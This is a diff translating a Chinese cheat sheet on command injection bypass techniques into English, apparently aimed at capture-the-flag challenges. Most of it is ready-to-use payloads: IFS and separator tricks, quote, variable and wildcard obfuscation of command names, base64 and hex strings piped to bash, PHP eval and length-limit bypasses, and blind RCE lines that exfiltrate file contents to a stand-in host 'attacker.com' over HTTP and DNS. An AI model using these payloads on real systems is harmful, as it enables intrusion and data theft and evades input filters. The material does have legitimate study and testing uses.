@@ -1,142 +1,142 @@
-# 命令注入绕过技巧大全
+# Command Injection Bypass Techniques
 
-## 空格绕过
+## Space Bypass
 
-| 方法 | 示例 | 说明 |
-|------|------|------|
-| `${IFS}` | `cat${IFS}flag.php` | 内部字段分隔符（默认空格/Tab/换行） |
-| `$IFS$9` | `cat$IFS$9flag.php` | `$9` 是当前 shell 第 9 个位置参数（空），防止变量名歧义 |
-| `${IFS}` + 变量 | `a=$IFS;cat${a}flag` | 赋值后引用 |
-| `<` | `cat<flag.php` | 重定向代替空格 |
-| `%09` | `cat%09flag.php` | Tab 的 URL 编码 |
-| `%0a` | `cat%0aflag.php` | 换行符 |
-| `{cat,flag.php}` | `{cat,flag.php}` | Bash 大括号展开（仅 Bash） |
-| `%0d` | `cat%0dflag.php` | 回车符 |
+| Method | Example | Notes |
+|--------|---------|-------|
+| `${IFS}` | `cat${IFS}flag.php` | Internal Field Separator (default: space/tab/newline) |
+| `$IFS$9` | `cat$IFS$9flag.php` | `$9` is the 9th positional parameter (empty), prevents variable name ambiguity |
+| `${IFS}` + variable | `a=$IFS;cat${a}flag` | Assign then reference |
+| `<` | `cat<flag.php` | Redirect instead of space |
+| `%09` | `cat%09flag.php` | URL-encoded tab |
+| `%0a` | `cat%0aflag.php` | Newline character |
+| `{cat,flag.php}` | `{cat,flag.php}` | Bash brace expansion (Bash only) |
+| `%0d` | `cat%0dflag.php` | Carriage return |
 
-### 空格绕过选择策略
-1. **首选** `$IFS$9` — 兼容性最好
-2. **备选** `<` — 简洁，但 `<` 在某些上下文可能被过滤
-3. **URL 场景** 用 `%09` 或 `%0a`
+### Space Bypass Selection Strategy
+1. **First choice**: `$IFS$9` — best compatibility
+2. **Fallback**: `<` — concise, but `<` may be filtered in some contexts
+3. **URL context**: use `%09` or `%0a`
 
-## 命令分隔符
+## Command Separators
 
-| 分隔符 | 示例 | 说明 |
-|--------|------|------|
-| `;` | `id;cat flag` | 顺序执行 |
-| `&&` | `id && cat flag` | 前成功才执行后 |
-| `\|\|` | `id \|\| cat flag` | 前失败才执行后 |
-| `\|` | `id \| cat flag` | 管道 |
-| `%0a` | `id%0acat flag` | 换行执行 |
+| Separator | Example | Notes |
+|-----------|---------|-------|
+| `;` | `id;cat flag` | Execute in sequence |
+| `&&` | `id && cat flag` | Execute second only if first succeeds |
+| `\|\|` | `id \|\| cat flag` | Execute second only if first fails |
+| `\|` | `id \| cat flag` | Pipe |
+| `%0a` | `id%0acat flag` | Newline execution |
 | `%0d%0a` | `id%0d%0acat flag` | CRLF |
 
-## 命令/关键字绕过
+## Command/Keyword Bypass
 
-### 字符串拼接
+### String Concatenation
 ```bash
-c'a't flag.php       # 单引号拼接
-c"a"t flag.php       # 双引号拼接
-c\at flag.php        # 反斜杠转义
+c'a't flag.php       # single-quote concatenation
+c"a"t flag.php       # double-quote concatenation
+c\at flag.php        # backslash escape
 ```
 
-### 变量拼接
+### Variable Concatenation
 ```bash
 a=c;b=at;$a$b flag.php
 a=fl;b=ag;cat /$a$b
 ```
 
-### 通配符
+### Wildcards
 ```bash
-cat /f???.php        # ? 匹配单字符
-cat /f*              # * 匹配任意字符
-/bin/ca? /etc/pas?d  # 路径中也可用
-cat /f[a-z]ag.php    # 字符类
+cat /f???.php        # ? matches single character
+cat /f*              # * matches any characters
+/bin/ca? /etc/pas?d  # also usable in paths
+cat /f[a-z]ag.php    # character class
 ```
 
-### base64 编码
+### Base64 Encoding
 ```bash
 echo Y2F0IGZsYWcucGhw | base64 -d | bash
 # Y2F0IGZsYWcucGhw = "cat flag.php"
 ```
 
-### hex 编码
+### Hex Encoding
 ```bash
 echo 63617420666c61672e706870 | xxd -r -p | bash
 # 63617420666c61672e706870 = "cat flag.php"
 ```
 
-### 使用未禁的替代命令
+### Using Alternative Commands
 
-| 目标 | 原命令 | 替代命令 |
-|------|--------|---------|
-| 读文件 | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
-| 读文件 | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
-| 查找文件 | find | ls -la / dir / echo / locate |
-| 下载 | wget | curl / nc / python -c 'import urllib...' |
-| 写文件 | echo > | tee / printf / python -c |
+| Goal | Original | Alternatives |
+|------|----------|-------------|
+| Read file | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
+| Read file | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
+| Find file | find | ls -la / dir / echo / locate |
+| Download | wget | curl / nc / python -c 'import urllib...' |
+| Write file | echo > | tee / printf / python -c |
 
-## 无回显利用（Blind RCE）
+## Blind RCE (No Output)
 
-当命令执行结果不可见时：
+When command execution results are not visible:
 
-### 1. DNS 外带
+### 1. DNS Exfiltration
 ```bash
 curl http://attacker.com/$(cat flag.php | base64)
 nslookup $(cat flag.php).attacker.com
 ```
 
-### 2. HTTP 外带
+### 2. HTTP Exfiltration
 ```bash
 curl http://attacker.com/?data=$(cat flag.php | base64)
 wget http://attacker.com/?data=$(cat flag.php | base64)
 ```
 
-### 3. 写文件到可访问路径
+### 3. Write to Accessible Path
 ```bash
 cat flag.php > /var/www/html/flag.txt
-# 然后浏览器访问 http://target/flag.txt
+# Then access http://target/flag.txt in browser
 ```
 
-### 4. 写入环境变量/临时文件
+### 4. Write to Environment/Temp File
 ```bash
 cp flag.php /tmp/flag
-# 再通过另一个漏洞读取 /tmp/flag
+# Then read /tmp/flag via another vulnerability
 ```
 
-### 5. 时间盲注
+### 5. Time-Based Blind
 ```bash
 if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
-# 逐字符爆破
+# Brute force character by character
 ```
 
-## PHP eval 特殊绕过
+## PHP eval Special Bypass
 
-### 空格过滤在 eval 场景
+### Space Filter in eval Context
 
 ```php
-// 当 eval($cmd) 且 $cmd 中的空格被过滤
-system("cat<flag.php");      // 重定向
+// When eval($cmd) and spaces in $cmd are filtered
+system("cat<flag.php");      // redirect
 system("cat${IFS}flag.php"); // IFS
-system("cat$IFS$9flag.php"); // IFS + 位置参数
+system("cat$IFS$9flag.php"); // IFS + positional param
 ```
 
-### 长度限制绕过
+### Length Limit Bypass
 
 ```php
-// 当参数长度有限制（如 strlen > 18）
-// 利用 PHP 变量展开
+// When parameter length is limited (e.g. strlen > 18)
+// Use PHP variable expansion
 ?a=system&b=cat flag.php
 // eval($_GET[a]($_GET[b]));
 ```
 
-### flag 关键字被替换
+### flag Keyword Replaced
 
 ```php
-// 当 "flag" 被替换为空格
-// 使用通配符
-cat /f*          # * 匹配 flag
-cat /fl?g.php    # ? 匹配单个字符
+// When "flag" is replaced with a space
+// Use wildcards
+cat /f*          # * matches flag
+cat /fl?g.php    # ? matches one character
 cat /fla?.php
-// 使用路径拼接
-cat /fl''ag.php  # 空字符串拼接
-cat /fl\ag.php   # 反斜杠（可能被解释为转义）
+// Use path concatenation
+cat /fl''ag.php  # empty string concatenation
+cat /fl\ag.php   # backslash (may be interpreted as escape)
 ```
